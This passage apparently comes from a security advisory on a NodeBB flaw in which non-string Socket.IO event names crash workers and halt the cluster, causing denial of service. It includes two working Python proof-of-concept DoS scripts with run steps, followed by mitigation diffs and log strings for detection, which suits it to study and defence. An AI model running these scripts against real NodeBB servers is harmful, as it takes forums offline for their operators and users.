<li>When storing event listeners (e.g. via <code>emitter.on()</code>) or looking up event listeners (e.g. via <code>emitter.emit()</code>), the event name supplied as argument is implicitly casted to <code>String</code> type.</li>
<li>However, the original event name supplied as argument is passed to the event listener without type-casting.</li>
<li>This results in user-supplied event names, which may be non-string values, within Socket.IO messages to be passed directly to event listeners.</li>
</ul>
<p>To avoid the early termination at [6] and preventing the condition at [5] from returning <code>true</code>, while still causing a <code>TypeError</code> to be thrown at [7], an array with a single element can be used to supply the event name:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="kr">const</span> <span class="nx">eventName</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;topics.loadMoreTags&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="p">[</span><span class="s2">&#34;topics.loadMoreTags&#34;</span><span class="p">].</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;topics.loadMoreTags&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="kr">const</span> <span class="nx">parts</span> <span class="o">=</span> <span class="nx">eventName</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="s2">&#34;topics&#34;</span><span class="p">,</span> <span class="s2">&#34;loadMoreTags&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nx">eventName</span><span class="p">.</span><span class="nx">startsWith</span> <span class="c1">// at [7]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kc">undefined</span>
</span></span></code></pre></div><p>Similarly, it is also possible to cause an uncaught exception earlier when invoking <code>eventName.toString()</code> at [3] by supplying an object with the <code>toString</code> property defined:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="kr">const</span> <span class="nx">eventName</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;toString&#34;</span><span class="o">:</span> <span class="mi">1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nx">eventName</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1">// TypeError
</span></span></span></code></pre></div><h3 id="crashing-nodebb-cluster-manager">Crashing NodeBB Cluster Manager:<a hidden class="anchor" aria-hidden="true" href="#crashing-nodebb-cluster-manager">#</a></h3>
<p>In <a href="https://github.com/NodeBB/NodeBB/blob/v2.8.9/loader.js#L71"><code>/loader.js</code></a>, the cluster manager attempts to restart the workers which exited abnormally:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Loader</span><span class="p">.</span><span class="nx">addWorkerEvents</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">worker</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">worker</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">signal</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">code</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nx">Loader</span><span class="p">.</span><span class="nx">timesStarted</span> <span class="o">&lt;</span> <span class="nx">numProcs</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">Loader</span><span class="p">.</span><span class="nx">timesStarted</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="nx">Loader</span><span class="p">.</span><span class="nx">crashTimer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">Loader</span><span class="p">.</span><span class="nx">crashTimer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="nx">Loader</span><span class="p">.</span><span class="nx">crashTimer</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="nx">Loader</span><span class="p">.</span><span class="nx">timesStarted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="p">},</span> <span class="mi">10000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">numProcs</span> <span class="o">*</span> <span class="mi">3</span><span class="si">}</span><span class="sb"> restarts in 10 seconds, most likely an error on startup. Halting.`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span> <span class="c1">// [8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[cluster] Child Process (</span><span class="si">${</span><span class="nx">worker</span><span class="p">.</span><span class="nx">pid</span><span class="si">}</span><span class="sb">) has exited (code: </span><span class="si">${</span><span class="nx">code</span><span class="si">}</span><span class="sb">, signal: </span><span class="si">${</span><span class="nx">signal</span><span class="si">}</span><span class="sb">)`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">worker</span><span class="p">.</span><span class="nx">suicide</span> <span class="o">||</span> <span class="nx">code</span> <span class="o">===</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[cluster] Spinning up another process...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="nx">forkWorker</span><span class="p">(</span><span class="nx">worker</span><span class="p">.</span><span class="nx">index</span><span class="p">,</span> <span class="nx">worker</span><span class="p">.</span><span class="nx">isPrimary</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Finally, at [8], if too many workers exited abnormally within the hard-coded 10 seconds threshold, the cluster manager concludes that a startup error had occurred and will terminate itself as well, killing all NodeBB workers.</p>
<p>Since an attacker can cause NodeBB workers to exit abruptly at will, this enables the attacker to terminate NodeBB completely, causing persistent denial-of-service.</p>
<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>No additional constraints were identified. An unauthenticated attacker is expected to be able to execute this exploit scenario reliably.</p>
<h2 id="reproduction-steps">Reproduction Steps:<a hidden class="anchor" aria-hidden="true" href="#reproduction-steps">#</a></h2>
<h3 id="proof-of-concept-1-dos-via-array-type-for-socketio-event-name">Proof-of-Concept #1: DoS via Array Type for Socket.IO Event Name<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-1-dos-via-array-type-for-socketio-event-name">#</a></h3>
<ol>
<li>Install Socket.IO client for Python using: <code>pip install &quot;python-socketio[client]&quot;</code>.</li>
<li>Save the following proof-of-concept exploit script as <code>dos-via-array.py</code>:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socketio</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delay</span> <span class="o">=</span> <span class="mf">0.5</span> <span class="c1"># in seconds</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dos</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span> <span class="o">=</span> <span class="n">socketio</span><span class="o">.</span><span class="n">Client</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">/socket.io&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">([</span><span class="s2">&#34;topics.loadMoreTags&#34;</span><span class="p">],</span> <span class="p">{})</span> <span class="c1"># reference any valid event handler within Namespaces</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">dos</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="n">delay</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://localhost:4567&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span></code></pre></div></li>
<li>Ensure that NodeBB is started using <code>./nodebb start</code>.</li>
<li>Run the exploit script using <code>python3 dos-via-array.py http://&lt;target-nodebb&gt;:&lt;port&gt;</code>.</li>
<li>Observe that after a few seconds, NodeBB terminates with the following message observed in the output logs:
<pre tabindex="0"><code>3 restarts in 10 seconds, most likely an error on startup. Halting.
</code></pre></li>
</ol>
<h3 id="proof-of-concept-2-dos-via-object-type-for-socketio-event-name">Proof-of-Concept #2: DoS via Object Type for Socket.IO Event Name<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-2-dos-via-object-type-for-socketio-event-name">#</a></h3>
<ol>
<li>Install Socket.IO client for Python using: <code>pip install &quot;python-socketio[client]&quot;</code></li>
<li>Save the following proof-of-concept exploit script as <code>dos-via-object.py</code>:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socketio</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delay</span> <span class="o">=</span> <span class="mf">0.5</span> <span class="c1"># in seconds</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dos</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span> <span class="o">=</span> <span class="n">socketio</span><span class="o">.</span><span class="n">Client</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">/socket.io&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sio</span><span class="o">.</span><span class="n">emit</span><span class="p">({</span><span class="s2">&#34;toString&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">},</span> <span class="p">{})</span> <span class="c1"># any object setting toString property</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">dos</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="n">delay</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://localhost:4567&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span></code></pre></div></li>
<li>Ensure that NodeBB is started using <code>./nodebb start</code>.</li>
<li>Run the exploit script using <code>python3 dos-via-object.py http://&lt;target-nodebb&gt;:&lt;port&gt;</code>.</li>
<li>Observe that after a few seconds, NodeBB terminates with the following message observed in the output logs:
<pre tabindex="0"><code>3 restarts in 10 seconds, most likely an error on startup. Halting.
</code></pre></li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations:<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
<p>Implement a validation check to ensure that <code>eventName</code> is of <code>String</code> type before processing the message received. For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">async function onMessage(socket, payload) {
</span></span><span class="line"><span class="cl">	...
</span></span><span class="line"><span class="cl"><span class="gi">+   if (typeof payload.data[0] !== &#34;string&#34;) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+       winston.warn(&#39;[socket.io] Non-string event name&#39;);
</span></span></span><span class="line"><span class="cl"><span class="gi">+       return socket.disconnect();
</span></span></span><span class="line"><span class="cl"><span class="gi">+   }
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>    const eventName = payload.data[0];
</span></span><span class="line"><span class="cl">    ...
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>It is also recommended to implement additional error handling to further prevent uncaught exceptions from crashing the NodeBB worker. For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">function onConnection(socket) {
</span></span><span class="line"><span class="cl">    ...
</span></span><span class="line"><span class="cl">    socket.onAny((event, ...args) =&gt; {
</span></span><span class="line"><span class="cl">        const payload = { data: [event].concat(args) };
</span></span><span class="line"><span class="cl">        const als = require(&#39;../als&#39;);
</span></span><span class="line"><span class="cl"><span class="gd">-       als.run({ uid: socket.uid }, onMessage, socket, payload);
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+       try {
</span></span></span><span class="line"><span class="cl"><span class="gi">+           als.run({ uid: socket.uid }, onMessage, socket, payload);
</span></span></span><span class="line"><span class="cl"><span class="gi">+       } catch (err) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+           winston.error(`${event}\n${err.stack ? err.stack : err.message}`);
</span></span></span><span class="line"><span class="cl"><span class="gi">+           socket.disconnect();
</span></span></span><span class="line"><span class="cl"><span class="gi">+       }
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>    });
</span></span><span class="line"><span class="cl">    ...
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to search for the following error messages in NodeBB&rsquo;s standard output/error and their respective log files to identify exploitation attempts of this vulnerability:</p>
<pre tabindex="0"><code>error: uncaughtException: eventName.toString is not a function
error: TypeError: eventName.toString is not a function
error: uncaughtException: eventName.startsWith is not a function
error: TypeError: eventName.startsWith is not a function
3 restarts in 10 seconds, most likely an error on startup. Halting.
</code></pre><h2 id="credits">Credits:<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Ngo Wei Lin (<a href="https://twitter.com/Creastery">@Creastery</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-27 Vendor Disclosure</li>
<li>2023-03-27 Initial Vendor Contact</li>
<li>2023-03-28 Vendor Patch Release (v2.8.10) containing partial fix</li>
<li>2023-04-11 Vendor Patch Release (v2.8.11) completely fixing vulnerability</li>
<li>2023-09-29 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-4198/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-4198) Dolibarr ERP CRM (&lt;= 17.0.3) Improper Access Control</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-2315/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
